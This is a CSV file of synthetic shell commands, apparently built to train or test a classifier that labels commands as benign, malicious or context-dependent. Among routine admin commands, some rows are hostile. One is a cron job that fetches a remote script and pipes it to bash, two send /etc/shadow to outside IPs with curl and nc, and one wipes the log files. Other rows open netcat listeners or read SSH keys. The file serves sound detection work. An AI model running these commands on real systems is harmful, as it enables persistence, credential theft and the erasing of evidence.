command,label,original_label,mitre_id
docker restart proxy,Benign,Synthetic,Synthetic
systemctl is-active nginx,Benign,Synthetic,Synthetic
mv /var/www/html/settings.json.old /var/www/html/settings.json,Benign,Synthetic,Synthetic
mv /home/deploy/healthcheck.sh.old /home/deploy/healthcheck.sh,Benign,Synthetic,Synthetic
(crontab -l; echo '*/5 * * * * curl http://10.10.14.5/1234/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
git branch -a,Benign,Synthetic,Synthetic
tar -xzf backup.tar.gz -C /tmp/restore,Benign,Synthetic,Synthetic
atop,Benign,Synthetic,Synthetic
base64 /etc/shadow | curl -d @- http://192.168.0.10:4444/,Malicious,Synthetic,Synthetic
rm -rf /var/log/*.log,Malicious,Synthetic,Synthetic
ls -la /home/user/projects,Benign,Synthetic,Synthetic
ncat -lvnp 9090,Context_Dependent,Synthetic,Synthetic
journalctl -u memcached --no-pager -n 20,Benign,Synthetic,Synthetic
ethtool eth0,Benign,Synthetic,Synthetic
dmesg -T | grep -i error,Benign,Synthetic,Synthetic
cat /proc/self/maps,Context_Dependent,Synthetic,Synthetic
nmap -sV 10.0.0.1,Context_Dependent,Synthetic,Synthetic
crontab -r,Context_Dependent,Synthetic,Synthetic
traceroute -n 8.8.8.8,Benign,Synthetic,Synthetic
nc -lvnp 1337,Context_Dependent,Synthetic,Synthetic
cat /etc/shadow | nc 10.0.0.1 9090,Malicious,Synthetic,Synthetic
nano /home/user/main.go,Benign,Synthetic,Synthetic
docker logs -f db,Benign,Synthetic,Synthetic
docker inspect proxy,Benign,Synthetic,Synthetic
tail -20 /etc/postgresql/14/main/pg_hba.conf,Benign,Synthetic,Synthetic
pgrep -la node,Benign,Synthetic,Synthetic
cat ~/.ssh/id_rsa,Context_Dependent,Synthetic,Synthetic
journalctl -p err -b,Benign,Synthetic,Synthetic
journalctl -xe,Benign,Synthetic,Synthetic
git pull --rebase,Benign,Synthetic,Synthetic
